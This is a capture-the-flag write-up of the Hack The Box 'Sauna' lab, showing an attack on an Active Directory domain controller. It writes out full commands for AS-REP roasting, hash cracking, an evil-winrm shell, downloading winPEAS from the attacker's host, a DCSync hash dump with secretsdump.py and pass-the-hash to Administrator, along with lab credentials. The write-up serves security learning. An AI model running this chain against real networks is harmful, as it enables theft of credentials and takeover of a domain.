## Summary

Sauna was a great box for learning some Active Directory recon and attacks through the use of impacket tooling.  It involved using [ASREPRoast](https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx) and cracking a hash to gain a foothold with a tool like evil-winrm, followed by enumeration of bad domain permissions to escalate privileges via a [DCSync Attack](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync).  

## Walkthrough

### Enumeration

Starting with nmap as always: ``nmap -A -T4 -v 10.10.10.175``

```bash
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-17 08:32:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
```

Based off this nmap, it is pretty clear to see it seems to be a domain controller with ports like 53 (DNS), 88 (Kerberos), etc. open.

I decided to checkout the website it is hosting.

![Sauna Website](/assets/images/HTBoxes/Sauna/sauna-website.png)

I poked around for awhile, it was basically a bank site.  I generally didn't know what to pursue next so I went to the forums for clues.  I had not used impacket tooling much at this point, and it looked like some of their scripts was where to go next.

I ended up playing with ``GetNPUsers.py`` from impacket and learning its parameters and how it can be used for [ASREPRoast](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a).

The user that worked was "fsmith" (a guess based off common username nomenclature) which basically was "Fergus Smith" from the "Meet the Team" section of the website.  So I ran the ``GetNPUsers.py`` script.

```bash
python GetNPUsers.py egotistical-bank.local/fsmith -no-pass -dc-ip 10.10.10.175

```

With this hash I ran it through John the ripper and used the usual rockyou.txt to see if I get a hit.

```bash
sudo john -w=/usr/share/wordlists/rockyou.txt fsmith-hash.txt

### Foothold

Alright, now I'm getting somewhere! I decided to try the enum4linux script that comes with Kali since I had a username and password. However, it didn't really point me at anything in particular and I didn't keep it in my notes to post here.

I eventually figured out that I could get a shell using ``evil-winrm`` which is a great tool.  I fired up a shell using the command ``evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23``

### User

Looking at the Desktop directory real quick I was able to grab the flag. I didn't have to move laterally as fsmith was the user to own here.

```powershell
*Evil-WinRM* PS C:\Users\FSmith\desktop> dir


    Directory: C:\Users\FSmith\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/23/2020  10:03 AM             34 user.txt


*Evil-WinRM* PS C:\Users\FSmith\desktop> type user.txt
1b55 ...
```

### Root

Onto root we go, I enumerated using [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS).

First I had to get it on the system: ``Invoke-WebRequest -Uri http://<myip>:8080/winPEAS.exe -OutFile winpeas.exe``

It has a good amount of output, but something sure stood out!

```powershell
[+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

I now had another set of credentials, but I wasn't sure what to do with them.  I did some more enumeration.  Eventually after getting a hint from the forums (I'm pretty bad at knowing what to enumerate for now, but I'm certain that will change as I learn more about what to look for..), I realized I could dump passwords using impacket again because of excessive permissions given to the _svc\_loanmgr_ account.  So that is what I did.

But before we get to that, I went back after owning root and did some reading on what I should of found in order to understand why ``secretsdump.py`` works.  I did some enumeration on the service account and found the excessive permissions (I was _svc\_loanmgr_ in the screenshot but it works as _fsmith_ user too):

```powershell
Import-module ActiveDirectory
(Get-Acl "ad:\dc=egotistical-bank,dc=local").Access | ? {$_.IdentityReference -match 'svc_loanmgr' -and ($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c" ) }
```

![DCSync-permissions](/assets/images/HTBoxes/Sauna/dcsync-permissions.png)

The service account has the permissions to replicate DC changes thus allowing for a DCSync attack.  Therefore, the ``secretsdump.py`` tool is able to dump hashes from the domain controller.

I dumped the hashes via impacket's secretsdump tool:

```bash
python secretsdump.py egotistical-bank.local/svc_loanmgr:"Moneymakestheworldgoround!"@10.10.10.175 -dc-ip 10.10.10.175

```

Finally, with the hash available I used evil-winrm to pass the hash to get an admininstrative shell on the box.

```powershell
evil-winrm -i 10.10.10.175 -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff

Evil-WinRM shell v2.3

### Lessons Learned

This box was very fun and many firsts for me when it comes to new tools.

Some of the things I learned with this box:

* How a DC Sync can happen with improper domain level permissions
* Some of the static GUIDs that roles have within a domain.  
* The tool Evil-WinRM which was easy to use.
* Attacking a domain controller using impacket tools.
